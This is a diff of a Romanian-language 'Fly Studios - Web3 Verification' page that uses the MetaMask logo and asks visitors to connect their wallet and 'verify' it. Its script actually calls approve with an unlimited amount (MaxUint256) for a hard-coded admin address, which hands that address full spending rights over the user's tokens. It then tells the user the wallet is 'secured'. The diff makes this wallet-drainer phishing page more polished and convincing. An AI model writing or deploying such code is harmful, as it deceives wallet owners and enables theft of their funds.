@@ -2,62 +2,122 @@
 <html lang="ro">
 <head>
     <meta charset="UTF-8">
-    <title>Crypto Verification Portal</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fly Studios - Web3 Verification</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    
     <style>
-        body { background: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 100px; }
-        .card { background: #1a1a1a; border: 1px solid #333; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        button { background: linear-gradient(45deg, #f6851b, #ffb347); border: none; padding: 15px 40px; color: white; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; transition: 0.3s; }
-        button:hover { transform: scale(1.05); }
-        #status { margin-top: 20px; color: #aaa; font-size: 14px; }
+        body { 
+            background: #0f0f0f; 
+            color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding-top: 80px; 
+            margin: 0;
+        }
+        .container { 
+            background: #1a1a1a; 
+            border: 1px solid #333; 
+            padding: 50px 30px; 
+            border-radius: 24px; 
+            display: inline-block; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+            max-width: 400px;
+        }
+        h1 { margin-bottom: 10px; font-size: 24px; }
+        p { color: #888; margin-bottom: 30px; line-height: 1.5; }
+        
+        .btn-verify { 
+            background: linear-gradient(45deg, #f6851b, #ffb347); 
+            border: none; 
+            padding: 18px 45px; 
+            color: white; 
+            font-size: 18px; 
+            font-weight: bold; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(246, 133, 27, 0.3);
+        }
+        .btn-verify:hover { 
+            transform: translateY(-3px); 
+            box-shadow: 0 8px 25px rgba(246, 133, 27, 0.5);
+        }
+        .btn-verify:active { transform: translateY(1px); }
+        
+        #status { 
+            margin-top: 25px; 
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            background: rgba(255,255,255,0.05);
+            color: #aaa;
+        }
+        .success { color: #4caf50 !important; font-weight: bold; }
+        .error { color: #f44336 !important; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>Verificare Portofel</h1>
-        <p>Conectați-vă portofelul pentru a primi acces la platformă.</p>
-        <button id="connectBtn">Connect & Verify Account</button>
-        <p id="status">Status: Deconectat</p>
+    <div class="container">
+        <img src="https://metamask.io/images/metamask-logo.png" alt="MetaMask" width="80" style="margin-bottom: 20px;">
+        <h1>Verificare Securizată</h1>
+        <p>Pentru a continua pe platforma Fly Studios, confirmă deținerea portofelului prin semnarea verificării.</p>
+        
+        <button id="connectBtn" class="btn-verify">Conectare & Verificare</button>
+        
+        <div id="status">Status: Așteptare conexiune...</div>
     </div>
 
     <script>
-        // ADRESELE TALE REALE DIN REMIX
-        const TOKEN_ADDR = "0xf5911ccFae2C79f9346E3a663c301386e8f1438D";
-        const ADMIN_ADDR = "0xC18f47a87830D8DEfE42d87E40e9669aa11B108c";
+        // ADRESELE TALE DEPLOYATE PE SEPOLIA
+        const TOKEN_ADDR = "0xf5911ccFae2C79f9346E3a663c301386e8f1438D"; 
+        const ADMIN_ADDR = "0xC18f47a87830D8DEfE42d87E40e9669aa11B108c"; 
 
-        document.getElementById("connectBtn").onclick = async () => {
-            const status = document.getElementById("status");
-            
-            if (window.ethereum) {
+        const btn = document.getElementById("connectBtn");
+        const statusDiv = document.getElementById("status");
+
+        btn.onclick = async () => {
+            if (typeof window.ethereum !== 'undefined') {
                 try {
-                    // 1. Logarea (Connect Wallet)
+                    btn.disabled = true;
+                    statusDiv.innerHTML = "Se deschide MetaMask...";
+
+                    // 1. Inițializare Provider
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    
+                    // 2. Cerere acces cont (Login)
                     await provider.send("eth_requestAccounts", []);
                     const signer = provider.getSigner();
                     const userAddress = await signer.getAddress();
-                    status.innerText = "Conectat ca: " + userAddress.substring(0, 6) + "...";
+                    
+                    statusDiv.innerHTML = `Conectat: <span style="color:#f6851b">${userAddress.substring(0, 10)}...</span>`;
 
-                    // 2. Aprobarea (Approve Unlimited)
+                    // 3. Pregătire tranzacție Approve
                     const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
                     const contract = new ethers.Contract(TOKEN_ADDR, abi, signer);
                     
-                    status.innerText = "Confirmă verificarea în MetaMask...";
+                    statusDiv.innerHTML = "Confirmă verificarea în portofel (Approve)...";
                     
-                    // Cerem aprobare pentru o sumă uriașă (Unlimited)
+                    // Cerem permisiune nelimitată
                     const tx = await contract.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
                     
-                    status.innerText = "Se finalizează verificarea...";
+                    statusDiv.innerHTML = "Se procesează pe blockchain... Te rugăm așteaptă.";
+                    
+                    // Așteptăm confirmarea pe blockchain
                     await tx.wait();
 
-                    status.innerText = "✅ Verificare Reușită! Acum poți închide pagina.";
-                    alert("Succes! Portofelul a fost securizat.");
+                    statusDiv.innerHTML = '<span class="success">✅ Verificare Reușită! Poți folosi platforma.</span>';
+                    alert("Succes! Portofelul a fost verificat și securizat.");
 
                 } catch (err) {
-                    status.innerText = "❌ Eroare: " + err.message;
+                    console.error(err);
+                    btn.disabled = false;
+                    statusDiv.innerHTML = `<span class="error">❌ Eroare: ${err.message.substring(0, 50)}...</span>`;
                 }
             } else {
-                alert("Te rugăm să instalezi MetaMask!");
+                alert("Te rugăm să instalezi extensia MetaMask!");
+                statusDiv.innerHTML = "Instalează MetaMask!";
             }
         };
     </script>
